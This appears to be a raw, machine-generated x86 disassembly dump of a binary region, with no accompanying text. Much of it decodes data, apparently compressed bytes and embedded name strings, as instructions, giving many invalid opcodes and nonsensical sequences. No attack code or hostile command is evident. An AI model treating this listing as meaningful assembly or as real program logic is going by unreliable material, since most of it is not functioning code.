  42785b:	jns    0x427898
  42785d:	ficom  DWORD PTR [ebx-0x2e]
  427860:	or     dh,BYTE PTR [esi-0x3]
  427863:	iret   
  427864:	jbe    0x427863
  427866:	jo     0x427802
  427868:	add    dh,dl
  42786a:	sbb    al,0xd3
  42786c:	repnz sub BYTE PTR [eax],al
  42786f:	(bad)  
  427870:	adc    al,0x0
  427872:	(bad)  
  427873:	xor    BYTE PTR [eax],al
  427875:	(bad)  
  427876:	dec    esp
  427877:	add    dh,dl
  427879:	mov    BYTE PTR [ebp+0xfe2b],bh
  42787f:	int    0x76
  427881:	mov    ch,cl
  427883:	lea    ecx,[edi+ebp*1+0x45]
  427887:	jge    0x42781b
  427889:	shr    ebx,cl
  42788b:	xchg   edx,eax
  42788c:	int    0x8d
  42788e:	mov    ch,cl
  427890:	xchg   esi,eax
  427891:	dec    esp
  427892:	cmp    edi,DWORD PTR [ecx+0x3b]
  427895:	fcmovbe st,st(3)
  427897:	repnz sub ch,cl
  42789a:	das    
  42789b:	push   ebx
  42789c:	rol    BYTE PTR [ebx+0x7d],cl
  42789f:	aam    0x36
  4278a1:	int    0x76
  4278a3:	xor    ch,cl
  4278a5:	lea    edx,[edi+ebp*1]
  4278a8:	inc    ebp
  4278a9:	jge    0x42783d
  4278ab:	shr    ebx,cl
  4278ad:	xchg   edx,eax
  4278ae:	int    0x8d
  4278b0:	xor    ch,cl
  4278b2:	xchg   esi,eax
  4278b3:	adc    al,0x3b
  4278b5:	jns    0x4278f2
  4278b7:	fcmovbe st,st(3)
  4278b9:	repnz sub ch,cl
  4278bc:	lea    ebx,[ebx+edx*2]
  4278bf:	shr    BYTE PTR [edi],cl
  4278c1:	shl    DWORD PTR [esi-0x3],1
  4278c4:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  4278ca:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  4278d1:	call   0xcd3c:0xd6cd6d3b
  4278d8:	xchg   esi,eax
  4278d9:	inc    esp
  4278da:	int    0xe6
  4278dc:	and    al,0x5d
  4278de:	mov    ebp,0x5f25230a
  4278e3:	jnp    0x42791c
  4278e5:	ficom  WORD PTR [ebx]
  4278e7:	inc    ebx
  4278e8:	icebp  
  4278e9:	das    
  4278ea:	or     BYTE PTR [edi],al
  4278ec:	add    BYTE PTR [eax-0x4613080],0x82
  4278f3:	test   BYTE PTR [ebx-0xc],al
  4278f6:	jnp    0x4278de
  4278f8:	inc    ebx
  4278f9:	hlt    
  4278fa:	(bad)  
  4278fb:	mov    BYTE PTR [ebx-0xf],al
  4278fe:	das    
  4278ff:	add    eax,0x80809216
  427904:	adc    bh,bh
  427906:	jno    0x42793f
  427908:	ficom  WORD PTR [ebx]
  42790a:	(bad)  
  42790b:	mov    BYTE PTR [ebx-0xf],al
  42790e:	das    
  42790f:	add    eax,0x80809285
  427914:	adc    bh,bh
  427916:	xchg   esi,eax
  427917:	aaa    
  427918:	ficom  WORD PTR [ebx]
  42791a:	(bad)  
  42791b:	mov    BYTE PTR [ebx-0xf],al
  42791e:	das    
  42791f:	add    eax,0x808080f8
  427924:	adc    bh,bh
  427926:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427927:	aaa    
  427928:	ficom  WORD PTR [ebx]
  42792a:	(bad)  
  42792b:	test   BYTE PTR [ebx-0xf],al
  42792e:	aam    0x3e
  427930:	adc    bh,bh
  427932:	scas   al,BYTE PTR es:[edi]
  427933:	aaa    
  427934:	ficom  WORD PTR [ebx]
  427936:	(bad)  
  427937:	mov    BYTE PTR [ebx-0xf],al
  42793a:	das    
  42793b:	add    eax,0x808081db
  427940:	adc    bh,bh
  427942:	mov    dh,0x37
  427944:	ficom  WORD PTR [ebx]
  427946:	das    
  427947:	push   es
  427948:	into   
  427949:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427953:	sub    bl,0x12
  427956:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  427960:	(bad)  
  427961:	adc    al,0x0
  427963:	(bad)  
  427964:	xor    BYTE PTR [eax],al
  427966:	(bad)  
  427967:	dec    esp
  427968:	add    dh,dl
  42796a:	mov    BYTE PTR [ebp+0xff77],bh
  427970:	jmp    0x427928
  427972:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  42797c:	mov    BYTE PTR [ebx-0xf],al
  42797f:	das    
  427980:	add    eax,0x80808019
  427985:	adc    bh,bh
  427987:	xchg   ecx,eax
  427988:	aaa    
  427989:	ficom  WORD PTR [ebx]
  42798b:	(bad)  
  42798c:	mov    BYTE PTR [ebx-0xf],al
  42798f:	das    
  427990:	add    eax,0x8080818e
  427995:	adc    bh,bh
  427997:	(bad)  
  427998:	aaa    
  427999:	ficom  WORD PTR [ebx]
  42799b:	(bad)  
  42799c:	test   BYTE PTR [ebx-0xf],al
  42799f:	aam    0x1c
  4279a1:	adc    bh,bh
  4279a3:	fidiv  WORD PTR [edi]
  4279a5:	ficom  WORD PTR [ebx]
  4279a7:	(bad)  
  4279a8:	mov    BYTE PTR [ebx-0xf],al
  4279ab:	das    
  4279ac:	add    eax,0x80808142
  4279b1:	adc    bh,bh
  4279b3:	out    0x37,al
  4279b5:	ficom  WORD PTR [ebx]
  4279b7:	in     al,dx
  4279b8:	iret   
  4279b9:	int    0x96
  4279bb:	mov    ch,cl
  4279bd:	(bad)  
  4279be:	dec    esp
  4279bf:	int    0xe6
  4279c1:	mov    ch,cl
  4279c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279c4:	dec    esp
  4279c5:	cmp    edx,DWORD PTR [ecx]
  4279c7:	cmp    esp,ebx
  4279c9:	das    
  4279ca:	inc    ebp
  4279cb:	sti    
  4279cc:	xchg   edx,eax
  4279cd:	shr    ecx,cl
  4279cf:	sub    BYTE PTR [edx],dl
  4279d1:	clc    
  4279d2:	add    BYTE PTR [eax-0x102c9380],0x92
  4279d9:	cmp    ebx,ebp
  4279db:	push   ebx
  4279dc:	clc    
  4279dd:	int    0xe6
  4279df:	mov    BYTE PTR [ebx-0x2b],dl
  4279e2:	int    0xa6
  4279e4:	dec    esp
  4279e5:	xchg   ecx,ebx
  4279e7:	sbb    esi,esp
  4279e9:	or     dl,BYTE PTR [esi+0x4cd60a88]
  4279ef:	int    0x96
  4279f1:	mov    ch,cl
  4279f3:	(bad)  
  4279f4:	dec    esp
  4279f5:	int    0xe6
  4279f7:	mov    ch,cl
  4279f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279fa:	dec    esp
  4279fb:	cmp    edx,DWORD PTR [ecx]
  4279fd:	cmp    esp,ebx
  4279ff:	das    
  427a00:	inc    ebp
  427a01:	sti    
  427a02:	xchg   edx,eax
  427a03:	shr    ecx,cl
  427a05:	sub    BYTE PTR [ebx],bh
  427a07:	fst    st(3)
  427a09:	out    dx,eax
  427a0a:	xchg   edx,eax
  427a0b:	adc    bh,al
  427a0d:	add    BYTE PTR [eax-0x2aac9380],0x53
  427a14:	clc    
  427a15:	ds xchg esi,eax
  427a17:	xor    BYTE PTR [esi],bl
  427a19:	(bad)  
  427a1a:	adc    al,0xcd
  427a1c:	xchg   esi,eax
  427a1d:	cmp    al,0xcd
  427a1f:	(bad)  
  427a20:	inc    esp
  427a21:	int    0x96
  427a23:	xor    ch,cl
  427a25:	(bad)  
  427a26:	adc    al,0xcd
  427a28:	xchg   esi,eax
  427a29:	xor    ch,cl
  427a2b:	(bad)  
  427a2c:	adc    al,0xcd
  427a2e:	out    0x30,al
  427a30:	int    0xa6
  427a32:	adc    al,0x3b
  427a34:	adc    DWORD PTR [ebx],edi
  427a36:	jecxz  0x427a67
  427a38:	inc    ebp
  427a39:	sti    
  427a3a:	xchg   edx,eax
  427a3b:	shr    ecx,cl
  427a3d:	sub    BYTE PTR [ebx],bh
  427a3f:	fst    QWORD PTR [edx]
  427a41:	clc    
  427a42:	add    BYTE PTR [eax-0x102c9380],0x92
  427a49:	push   ebx
  427a4a:	clc    
  427a4b:	int    0xe6
  427a4d:	cmp    al,0x53
  427a4f:	aad    0xcd
  427a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a52:	inc    esp
  427a53:	cmp    edi,edx
  427a55:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a5b:	lea    eax,[edi+ebp*1+0x45]
  427a5f:	loope  0x4279f3
  427a61:	cmp    ecx,ebx
  427a63:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427a69:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427a6e:	lea    esi,[eax]
  427a70:	shr    esp,cl
  427a72:	xchg   edx,eax
  427a73:	push   ebx
  427a74:	popf   
  427a75:	xchg   ecx,ebx
  427a77:	int    0x96
  427a79:	adc    al,0x1b
  427a7b:	hlt    
  427a7c:	add    al,0xf2
  427a7e:	std    
  427a7f:	shr    edi,cl
  427a81:	sub    BYTE PTR [ebx],bh
  427a83:	ins    DWORD PTR es:[edi],dx
  427a84:	adc    al,BYTE PTR [edx]
  427a86:	aam    0x37
  427a88:	ficom  WORD PTR [ebx]
  427a8a:	adc    bh,bl
  427a8c:	mov    ebp,0xcd25230a
  427a91:	out    0x3c,al
  427a93:	int    0xa6
  427a95:	inc    esp
  427a96:	add    al,0xe9
  427a98:	std    
  427a99:	adc    bh,al
  427a9b:	aam    0x37
  427a9d:	ficom  WORD PTR [ebx]
  427a9f:	adc    dh,ah
  427aa1:	mov    ebp,0x8725230a
  427aa6:	lock int 0xe6
  427aa9:	and    al,0x1b
  427aab:	aad    0x53
  427aad:	rcl    BYTE PTR [esi-0x43],cl
  427ab0:	or     ah,BYTE PTR [ebx]
  427ab2:	and    eax,0x12025370
  427ab7:	not    esi
  427ab9:	aaa    
  427aba:	ficom  WORD PTR [ebx]
  427abc:	cwde   
  427abd:	add    dh,dl
  427abf:	xor    al,0x0
  427ac1:	(bad)  
  427ac2:	sub    al,0x9a
  427ac4:	add    dh,dl
  427ac6:	sbb    al,0x0
  427ac8:	(bad)  
  427ac9:	adc    al,0x0
  427acb:	(bad)  
  427acc:	xor    BYTE PTR [eax],al
  427ace:	(bad)  
  427acf:	dec    esp
  427ad0:	add    dh,dl
  427ad2:	mov    BYTE PTR [ebp+0xfef4],bh
  427ad8:	or     cl,BYTE PTR [ebx-0x57557433]
  427ade:	arpl   bx,cx
  427ae0:	sar    BYTE PTR [eax+eax*4],cl
  427ae3:	int    0x96
  427ae5:	mov    ch,cl
  427ae7:	(bad)  
  427ae8:	dec    esp
  427ae9:	int    0xe6
  427aeb:	mov    ch,cl
  427aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427aee:	dec    esp
  427aef:	cmp    esp,ebx
  427af1:	cmp    edx,DWORD PTR [ecx]
  427af3:	das    
  427af4:	inc    ebp
  427af5:	sti    
  427af6:	xchg   edx,eax
  427af7:	shr    ecx,cl
  427af9:	sub    BYTE PTR [edx],dl
  427afb:	clc    
  427afc:	add    BYTE PTR [eax-0x102c9380],0x92
  427b03:	cmp    ebx,ebp
  427b05:	push   ebx
  427b06:	aad    0x53
  427b08:	clc    
  427b09:	int    0xe6
  427b0b:	xor    ch,cl
  427b0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b0e:	adc    al,0x53
  427b10:	fst    DWORD PTR [ebx-0xc]
  427b13:	or     dl,BYTE PTR [esi+0x14d60a30]
  427b19:	int    0x96
  427b1b:	cmp    al,0xcd
  427b1d:	(bad)  
  427b1e:	inc    esp
  427b1f:	int    0x96
  427b21:	xor    ch,cl
  427b23:	(bad)  
  427b24:	adc    al,0xcd
  427b26:	xchg   esi,eax
  427b27:	mov    ch,cl
  427b29:	(bad)  
  427b2a:	dec    esp
  427b2b:	int    0x96
  427b2d:	mov    ch,cl
  427b2f:	(bad)  
  427b30:	dec    esp
  427b31:	int    0xe6
  427b33:	mov    ch,cl
  427b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b36:	dec    esp
  427b37:	cmp    esp,ebx
  427b39:	cmp    edx,DWORD PTR [ecx]
  427b3b:	das    
  427b3c:	inc    ebp
  427b3d:	sti    
  427b3e:	xchg   edx,eax
  427b3f:	shr    ecx,cl
  427b41:	sub    BYTE PTR [edx],dl
  427b43:	clc    
  427b44:	add    BYTE PTR [eax-0x22c49380],0x53
  427b4b:	aad    0xd3
  427b4d:	out    dx,eax
  427b4e:	xchg   edx,eax
  427b4f:	push   ebx
  427b50:	clc    
  427b51:	int    0xe6
  427b53:	xor    ch,cl
  427b55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b56:	adc    al,0x3b
  427b58:	cli    
  427b59:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b5f:	lea    edx,[edi+ebp*1]
  427b62:	inc    ebp
  427b63:	loope  0x427af7
  427b65:	cmp    ecx,ebx
  427b67:	push   ebx
  427b68:	cli    
  427b69:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427b6f:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427b74:	push   ebx
  427b75:	popf   
  427b76:	int    0x76
  427b78:	cmp    al,0xcd
  427b7a:	lea    eax,[edi+eax*4-0x27]
  427b7e:	int    0xe6
  427b80:	cmp    al,0x1b
  427b82:	hlt    
  427b83:	int    0xa6
  427b85:	inc    esp
  427b86:	adc    al,BYTE PTR [edx]
  427b88:	mov    ebp,0x5625230a
  427b8d:	jnp    0x427bc6
  427b8f:	ficom  WORD PTR [ebx]
  427b91:	das    
  427b92:	inc    ebp
  427b93:	jge    0x427b27
  427b95:	shr    ecx,cl
  427b97:	sub    bl,dl
  427b99:	jmp    0x427b2d
  427b9b:	cmp    ebx,ebp
  427b9d:	adc    bh,al
  427b9f:	add    BYTE PTR [eax-0xfac9380],0x53
  427ba6:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427bac:	lea    ecx,[eax-0x32b36933]
  427bb2:	out    0x30,al
  427bb4:	int    0xa6
  427bb6:	adc    al,0x4
  427bb8:	repnz std 
  427bba:	add    al,0xe9
  427bbc:	std    
  427bbd:	adc    al,BYTE PTR [edx]
  427bbf:	aam    0x37
  427bc1:	ficom  WORD PTR [ebx]
  427bc3:	adc    bh,al
  427bc5:	aam    0x37
  427bc7:	ficom  WORD PTR [ebx]
  427bc9:	shr    edi,cl
  427bcb:	sub    BYTE PTR [ebx],bh
  427bcd:	ins    DWORD PTR es:[edi],dx
  427bce:	adc    bh,bl
  427bd0:	mov    ebp,0x1225230a
  427bd5:	hlt    
  427bd6:	mov    ebp,0x8725230a
  427bdb:	lock sbb edx,ebp
  427bde:	jmp    0x427c27
  427be0:	inc    DWORD PTR [eax]
  427be2:	add    BYTE PTR [esi-0x12fb1233],dl
  427be8:	sbb    al,0x98
  427bea:	pop    edi
  427beb:	(bad)  
  427bec:	aaa    
  427bed:	ficom  WORD PTR [ebx]
  427bef:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427bf5:	and    esp,DWORD PTR ds:0xc9f5760a
  427bfb:	jbe    0x427bba
  427bfd:	xchg   ecx,eax
  427bfe:	aaa    
  427bff:	ficom  WORD PTR [ebx]
  427c01:	or     dh,BYTE PTR [esi-0x13]
  427c04:	int    0x96
  427c06:	adc    ebp,ecx
  427c08:	(bad)  
  427c09:	cmc    
  427c0a:	call   0xefd3:0x92fb452f
  427c11:	xchg   edx,eax
  427c12:	int    0xd6
  427c14:	adc    ebp,ecx
  427c16:	out    0xf5,al
  427c18:	jo     0x427c2c
  427c1a:	sti    
  427c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c1c:	mov    esi,0x3b4229
  427c21:	jno    0x427c76
  427c23:	(bad)  [edx]
  427c25:	xchg   esi,eax
  427c26:	std    
  427c27:	int    0x96
  427c29:	dec    esp
  427c2a:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427c30:	iret   
  427c31:	jbe    0x427c30
  427c33:	add    dh,dl
  427c35:	mov    bl,dl
  427c37:	mov    ecx,0xd6007028
  427c3c:	dec    esp
  427c3d:	add    dh,dl
  427c3f:	in     eax,dx
  427c40:	add    dh,dl
  427c42:	mov    ebp,0xf5d600
  427c47:	(bad)  
  427c48:	adc    DWORD PTR [ebp+0xfde6],edi
  427c4e:	stos   BYTE PTR es:[edi],al
  427c4f:	or     dh,BYTE PTR [esi-0x3]
  427c52:	int    0x76
  427c54:	std    
  427c55:	test   al,0xcb
  427c57:	ror    BYTE PTR [eax-0x12326980],cl
  427c5d:	add    al,0xb5
  427c5f:	stc    
  427c60:	add    al,0xed
  427c62:	inc    esp
  427c63:	cwde   
  427c64:	leave  
  427c65:	je     0x427c9b
  427c67:	xor    al,0x80
  427c69:	add    BYTE PTR [eax+0x3474c980],0x44
  427c70:	add    BYTE PTR [eax+0x74cf8080],0x34
  427c77:	xor    BYTE PTR [eax+0x0],dh
  427c7a:	(bad)  
  427c7b:	xor    al,0x0
  427c7d:	(bad)  
  427c7e:	sub    al,0x0
  427c80:	(bad)  
  427c81:	and    al,0x0
  427c83:	(bad)  
  427c84:	sbb    al,0x0
  427c86:	(bad)  
  427c87:	adc    al,0x0
  427c89:	(bad)  
  427c8a:	xor    BYTE PTR [eax],al
  427c8c:	(bad)  
  427c8d:	dec    esp
  427c8e:	add    dh,dl
  427c90:	mov    BYTE PTR [ebp+0xe7e7],bh
  427c96:	int    0x76
  427c98:	mov    BYTE PTR [edx],cl
  427c9a:	je     0x427cd0
  427c9c:	test   ch,cl
  427c9e:	je     0x427cd4
  427ca0:	xor    al,0x6
  427ca2:	ins    DWORD PTR es:[edi],dx
  427ca3:	das    
  427ca4:	add    eax,0x80808017
  427ca9:	int    0x74
  427cab:	xor    al,0x44
  427cad:	push   es
  427cae:	ins    DWORD PTR es:[edi],dx
  427caf:	das    
  427cb0:	add    eax,0x8080800a
  427cb5:	add    ah,dl
  427cb7:	xor    al,0x24
  427cb9:	add    ah,dl
  427cbb:	xor    al,0x24
  427cbd:	add    ah,dl
  427cbf:	xor    al,0x24
  427cc1:	int    0x74
  427cc3:	xor    al,0x50
  427cc5:	add    cl,dh
  427cc7:	int    0x74
  427cc9:	xor    al,0x84
  427ccb:	int    0x74
  427ccd:	xor    al,0x84
  427ccf:	int    0x74
  427cd1:	xor    al,0x84
  427cd3:	iret   
  427cd4:	jbe    0x427c5a
  427cd6:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427cda:	int    0x74
  427cdc:	xor    al,0x3c
  427cde:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427ce2:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427ce6:	int    0x74
  427ce8:	xor    al,0x84
  427cea:	int    0x74
  427cec:	xor    al,0x84
  427cee:	int    0x8c
  427cf0:	xor    al,0x84
  427cf2:	int    0xa
  427cf4:	and    eax,0xcd808081
  427cf9:	xor    ebp,ecx
  427cfb:	aam    0x34
  427cfd:	mov    ch,cl
  427cff:	add    DWORD PTR ds:0x5e808081,ebp
  427d05:	sbb    BYTE PTR [edi],ch
  427d07:	or     edx,DWORD PTR ds:0xcd808081
  427d0d:	xor    ch,cl
  427d0f:	push   eax
  427d10:	int    0x62
  427d12:	fs iret 
  427d14:	xchg   esp,eax
  427d15:	sbb    BYTE PTR [eax-0x33],dh
  427d18:	push   ecx
  427d19:	int    0x22
  427d1b:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427d21:	pop    esi
  427d22:	sbb    BYTE PTR [edi],ch
  427d24:	add    al,0x7b
  427d26:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427d30:	dec    edx
  427d31:	int    0x80
  427d33:	xor    ecx,DWORD PTR [edi]
  427d35:	xchg   ebx,edx
  427d37:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427d3d:	or     ch,0x74
  427d40:	xor    al,0x44
  427d42:	push   es
  427d43:	ins    DWORD PTR es:[edi],dx
  427d44:	das    
  427d45:	push   es
  427d46:	cwde   
  427d47:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d51:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d5b:	je     0x427d91
  427d5d:	test   ch,cl
  427d5f:	add    DWORD PTR ds:0xcd808081,esp
  427d65:	or     BYTE PTR [edx],0x74
  427d68:	xor    al,0x4c
  427d6a:	int    0x74
  427d6c:	xor    al,0x84
  427d6e:	int    0x1
  427d70:	or     DWORD PTR [ecx-0x7f327f80],eax
  427d76:	int    0x80
  427d78:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427d7c:	int    0x74
  427d7e:	xor    al,0x84
  427d80:	int    0x1
  427d82:	int3   
  427d83:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427d8d:	dec    esp
  427d8e:	int    0x74
  427d90:	xor    al,0x84
  427d92:	int    0x8c
  427d94:	xor    al,0x84
  427d96:	int    0x1
  427d98:	popf   
  427d99:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427da3:	or     ch,0x89
  427da6:	imul   edx,ecx,0x3b358621
  427dac:	jns    0x427db2
  427dae:	add    bh,bh
  427db0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427db6:	push   ebx
  427db7:	jge    0x427dc3
  427db9:	mov    WORD PTR [esp+ecx*2],?
  427dbc:	leave  
  427dbd:	je     0x427df3
  427dbf:	mov    BYTE PTR [eax-0x327f7f80],al
  427dc5:	je     0x427dfb
  427dc7:	xor    al,0x6
  427dc9:	ins    DWORD PTR es:[edi],dx
  427dca:	aam    0x73
  427dcc:	int    0x74
  427dce:	xor    al,0x30
  427dd0:	add    al,0xbd
  427dd2:	adc    ah,0x52
  427dd5:	jl     0x427dab
  427dd7:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427ddb:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427ddf:	add    ah,dl
  427de1:	xor    al,0x2c
  427de3:	add    ah,dl
  427de5:	xor    al,0x2c
  427de7:	add    ah,dl
  427de9:	xor    al,0x2c
  427deb:	add    ah,dl
  427ded:	xor    al,0x2c
  427def:	int    0x74
  427df1:	xor    al,0x54
  427df3:	add    cl,dh
  427df5:	in     al,dx
  427df6:	cmp    BYTE PTR [eax],al
  427df8:	aam    0x34
  427dfa:	and    al,0x0
  427dfc:	aam    0x34
  427dfe:	and    al,0x0
  427e00:	aam    0x34
  427e02:	and    al,0xcd
  427e04:	je     0x427e3a
  427e06:	push   eax
  427e07:	add    cl,dh
  427e09:	in     al,dx
  427e0a:	and    al,BYTE PTR [eax]
  427e0c:	aam    0x34
  427e0e:	adc    al,0xcd
  427e10:	je     0x427e46
  427e12:	cmp    al,0x0
  427e14:	icebp  
  427e15:	in     al,dx
  427e16:	xchg   ch,cl
  427e18:	je     0x427e4e
  427e1a:	xor    al,0x0
  427e1c:	icebp  
  427e1d:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427e21:	int    0x74
  427e23:	xor    al,0x4c
  427e25:	push   es
  427e26:	ins    DWORD PTR es:[edi],dx
  427e27:	aam    0x4e
  427e29:	int    0x74
  427e2b:	xor    al,0x84
  427e2d:	leave  
  427e2e:	add    DWORD PTR [ebp+0x41808081],ebp
  427e34:	and    DWORD PTR [esi+0x3474cd35],eax
  427e3a:	mov    ch,cl
  427e3c:	mov    WORD PTR [esp+eax*4],?
  427e3f:	int    0xa
  427e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e42:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e4c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e52:	mov    ch,cl
  427e54:	mov    WORD PTR [eax+ecx*4],?
  427e57:	cmp    edi,DWORD PTR [ecx+0x4]
  427e5a:	add    bh,bh
  427e5c:	shl    edx,cl
  427e5e:	sub    bl,dl
  427e60:	mov    ebp,0xcdd35392
  427e65:	mov    WORD PTR [esp+ecx*2],?
  427e68:	inc    ebx
  427e69:	rcl    esi,cl
  427e6b:	and    ecx,ebp
  427e6d:	je     0x427ea3
  427e6f:	test   ch,cl
  427e71:	mov    WORD PTR [esp+eax*4],?
  427e74:	int    0xa
  427e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e77:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427e81:	add    BYTE PTR [eax],0x70
  427e84:	cmp    al,0xec
  427e86:	push   ds
  427e87:	iret   
  427e88:	jbe    0x427e0e
  427e8a:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427e8e:	int    0x74
  427e90:	xor    al,0x4c
  427e92:	int    0x8c
  427e94:	xor    al,0x84
  427e96:	int    0xa
  427e98:	in     al,0x81
  427e9a:	add    BYTE PTR [eax-0x777e7633],0xcd
  427ea1:	je     0x427ed7
  427ea3:	test   ch,cl
  427ea5:	add    ebp,ebp
  427ea7:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427eb1:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427eb7:	or     bh,0x84
  427eba:	adc    cl,ch
  427ebc:	mov    WORD PTR [esp+eax*4],?
  427ebf:	int    0xa
  427ec1:	in     al,0x81
  427ec3:	add    BYTE PTR [eax-0x76327f33],0x81
  427eca:	mov    BYTE PTR [eax-0x2d591833],ch
  427ed0:	sub    al,0x80
  427ed2:	lds    edx,FWORD PTR [eax+0x75]
  427ed5:	ins    BYTE PTR es:[edi],dx
  427ed6:	jae    0x427f4f
  427ed8:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427edc:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427ee0:	add    BYTE PTR [ecx+0x74],ah
  427ee3:	ins    BYTE PTR es:[edi],dx
  427ee4:	popa   
  427ee5:	inc    esp
  427ee6:	gs popa 
  427ee8:	fs push 0x6561686d
  427eee:	add    BYTE PTR fs:[ebp+0x74],ah
  427ef2:	push   0x65726143
  427ef7:	outs   dx,DWORD PTR ds:[esi]
  427ef8:	jns    0x427f60
  427efa:	add    BYTE PTR gs:[edi+0x72],dh
  427efe:	jns    0x427f6d
  427f00:	popa   
  427f01:	outs   dx,DWORD PTR ds:[esi]
  427f02:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427f06:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427f0a:	push   0x6f6d6568
  427f0f:	add    BYTE PTR fs:[edx+0x65],dl
  427f13:	arpl   WORD PTR [ebx+0x62],si
  427f16:	popa   
  427f17:	ins    BYTE PTR es:[edi],dx
  427f18:	jne    0x427f92
  427f1a:	gs jae 0x427f1d
  427f1d:	ins    DWORD PTR es:[edi],dx
  427f1e:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427f25:	outs   dx,DWORD PTR ds:[esi]
  427f26:	jb     0x427f97
  427f28:	jo     0x427f2a
  427f2a:	ja     0x427f8d
  427f2c:	gs je  0x427f9e
  427f2f:	jb     0x427fa0
  427f31:	bound  esp,QWORD PTR [ecx+0x70]
  427f34:	add    BYTE PTR [ebx+0x69],cl
  427f37:	outs   dx,BYTE PTR ds:[esi]
  427f38:	addr16 addr16 popa 
  427f3b:	outs   dx,BYTE PTR ds:[esi]
  427f3c:	arpl   WORD PTR [ecx+0x70],sp
  427f3f:	add    BYTE PTR [edi+0x6e],al
  427f42:	jne    0x427fb7
  427f44:	je     0x427fab
  427f46:	outs   dx,BYTE PTR ds:[esi]
  427f47:	push   esi
  427f48:	popa   
  427f49:	jb     0x427fc4
  427f4b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f4f:	jb     0x427fa1
  427f51:	popa   
  427f52:	ins    BYTE PTR es:[edi],dx
  427f53:	ins    DWORD PTR es:[edi],dx
  427f54:	je     0x427fbf
  427f56:	outs   dx,DWORD PTR ds:[esi]
  427f57:	ja     0x427fbe
  427f59:	jb     0x427f5b
  427f5b:	jo     0x427fc2
  427f5d:	ins    DWORD PTR es:[edi],dx
  427f5e:	jns    0x427fd4
  427f60:	push   0x6f656562
  427f65:	outs   dx,BYTE PTR ds:[esi]
  427f66:	push   eax
  427f67:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427f6e:	inc    ebx
  427f6f:	outs   dx,DWORD PTR ds:[esi]
  427f70:	popa   
  427f71:	ins    BYTE PTR es:[edi],dx
  427f72:	popa   
  427f73:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427f7a:	je     0x427ff5
  427f7c:	outs   dx,DWORD PTR gs:[esi]
  427f7e:	outs   dx,BYTE PTR ds:[esi]
  427f7f:	gs ins BYTE PTR es:[edi],dx
  427f81:	inc    ebx
  427f82:	push   0x54007261
  427f87:	jns    0x427ff9
  427f89:	jns    0x427ff8
  427f8b:	jne    0x427ff2
  427f8d:	imul   eax,DWORD PTR gs:[eax],0x70
  427f91:	outs   dx,DWORD PTR ds:[esi]
  427f92:	je     0x427fd6
  427f94:	gs gs jb 0x428008
  427f98:	outs   dx,DWORD PTR ds:[esi]
  427f99:	je     0x428006
  427f9b:	imul   eax,DWORD PTR [eax],0x616c7548
  427fa1:	jo     0x42800c
  427fa3:	popa   
  427fa4:	ins    BYTE PTR es:[edi],dx
  427fa5:	dec    ebx
  427fa6:	outs   dx,BYTE PTR ds:[esi]
  427fa7:	popa   
  427fa8:	jo     0x428023
  427faa:	add    BYTE PTR gs:[eax+0x6f],dh
  427fae:	je     0x427ff2
  427fb0:	gs ins BYTE PTR es:[edi],dx
  427fb2:	jae    0x428023
  427fb4:	js     0x427fb6
  427fb6:	popa   
  427fb7:	data16 je 0x428000
  427fba:	ins    BYTE PTR es:[edi],dx
  427fbb:	popa   
  427fbc:	imul   esp,DWORD PTR [ebp+0x78],0x70
  427fc0:	gs jae 0x428024
  427fc3:	jb     0x427fc5
  427fc5:	inc    edx
  427fc6:	ins    BYTE PTR es:[edi],dx
  427fc7:	popa   
  427fc8:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
